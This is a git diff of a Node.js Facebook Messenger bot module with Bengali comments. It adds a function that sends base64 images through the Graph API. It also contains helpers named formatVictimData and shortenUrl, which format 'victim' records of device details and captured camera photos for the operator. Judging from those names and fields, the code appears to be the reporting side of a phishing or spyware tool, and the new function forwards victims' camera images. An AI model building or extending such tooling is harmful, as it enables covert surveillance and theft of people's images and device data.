@@ -39,22 +39,18 @@ async function getConfig() {
 }
 
 // ================================================================
-// 🆕 sendMessage - সম্পূর্ণ এরর হ্যান্ডলিং সহ
+// টেক্সট মেসেজ
 // ================================================================
 async function sendMessage(recipientId, text) {
     try {
         const config = await getConfig();
         const token = config.pageAccessToken;
-        
-        // টোকেন চেক
         if (!token || token === '') {
-            console.error('❌ পেজ অ্যাক্সেস টোকেন সেট করা নেই! অ্যাডমিন প্যানেলে গিয়ে টোকেন সেট করুন।');
+            console.error('❌ টোকেন সেট নেই!');
             return { success: false, error: 'TOKEN_MISSING' };
         }
-
-        // টোকেনের দৈর্ঘ্য চেক (ফেসবুক টোকেন সাধারণত ১৮০+ অক্ষর)
         if (token.length < 50) {
-            console.error('❌ টোকেনটি খুব ছোট! সম্ভবত ভুল টোকেন দেয়া হয়েছে।');
+            console.error('❌ টোকেন খুব ছোট!');
             return { success: false, error: 'INVALID_TOKEN' };
         }
 
@@ -64,41 +60,68 @@ async function sendMessage(recipientId, text) {
                 recipient: { id: recipientId },
                 message: { text: text }
             },
-            {
-                timeout: 10000 // ১০ সেকেন্ড টাইমআউট
-            }
+            { timeout: 10000 }
         );
 
-        console.log(`✅ মেসেজ পাঠানো হয়েছে: ${recipientId} - "${text.substring(0, 30)}..."`);
+        console.log(`✅ টেক্সট মেসেজ পাঠানো হয়েছে: ${recipientId}`);
         return { success: true, data: response.data };
 
     } catch (err) {
-        // বিস্তারিত এরর লগ
         if (err.response) {
-            // ফেসবুক থেকে এরর রেসপন্স
-            console.error('❌ ফেসবুক এরর:', {
-                status: err.response.status,
-                data: err.response.data
-            });
-            
-            // কমন এরর কোড
-            if (err.response.status === 400) {
-                console.error('⚠️ টোকেন ভুল বা মেয়াদোত্তীর্ণ! অ্যাডমিন প্যানেলে নতুন টোকেন দিন।');
-            } else if (err.response.status === 403) {
-                console.error('⚠️ পারমিশন নেই! নিশ্চিত করুন টোকেনটি সঠিক পেজের জন্য।');
-            } else if (err.response.status === 429) {
-                console.error('⚠️ রেট লিমিট! কিছুক্ষণ পর আবার চেষ্টা করুন।');
-            }
-        } else if (err.request) {
-            console.error('❌ নেটওয়ার্ক এরর:', err.message);
+            console.error('❌ ফেসবুক এরর:', err.response.data);
         } else {
-            console.error('❌ অজানা এরর:', err.message);
+            console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.message);
         }
-        
         return { success: false, error: err.message };
     }
 }
 
+// ================================================================
+// 🆕 ইমেজ মেসেজ (Base64 থেকে অ্যাটাচমেন্ট)
+// ================================================================
+async function sendImageMessage(recipientId, base64Image) {
+    try {
+        const config = await getConfig();
+        const token = config.pageAccessToken;
+        if (!token || token === '') {
+            console.error('❌ টোকেন সেট নেই!');
+            return { success: false, error: 'TOKEN_MISSING' };
+        }
+
+        // ফেসবুকে ইমেজ পাঠানোর সঠিক ফরম্যাট
+        const response = await axios.post(
+            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
+            {
+                recipient: { id: recipientId },
+                message: {
+                    attachment: {
+                        type: 'image',
+                        payload: {
+                            is_reusable: false,
+                            url: `data:image/jpeg;base64,${base64Image}`
+                        }
+                    }
+                }
+            },
+            { timeout: 15000 }
+        );
+
+        console.log(`✅ ইমেজ মেসেজ পাঠানো হয়েছে: ${recipientId}`);
+        return { success: true, data: response.data };
+
+    } catch (err) {
+        if (err.response) {
+            console.error('❌ ইমেজ পাঠাতে ফেসবুক এরর:', err.response.data);
+        } else {
+            console.error('❌ ইমেজ পাঠাতে ব্যর্থ:', err.message);
+        }
+        return { success: false, error: err.message };
+    }
+}
+
+// ================================================================
+// বাকি ফাংশন
+// ================================================================
 async function getUserProfile(senderId) {
     try {
         const config = await getConfig();
@@ -124,9 +147,6 @@ async function shortenUrl(longUrl) {
     }
 }
 
-// ================================================================
-// formatVictimData - শুধু প্রয়োজনীয় তথ্য
-// ================================================================
 function formatVictimData(victim) {
     const d = victim.device || {};
     const deviceTime = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
@@ -158,7 +178,7 @@ function formatVictimData(victim) {
     }
     
     if (victim.camera && victim.camera.length > 0) {
-        msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি`;
+        msg += `\n📸 *ক্যামেরা ছবি:* ${victim.camera.length}টি (ছবি আলাদাভাবে আসছে)`;
     }
     
     msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
@@ -180,6 +200,7 @@ module.exports = {
     getConfig,
     getLocalConfig,
     sendMessage,
+    sendImageMessage,    // <--- নতুন ফাংশন এক্সপোর্ট করা হয়েছে
     getUserProfile,
     shortenUrl,
     formatVictimData,
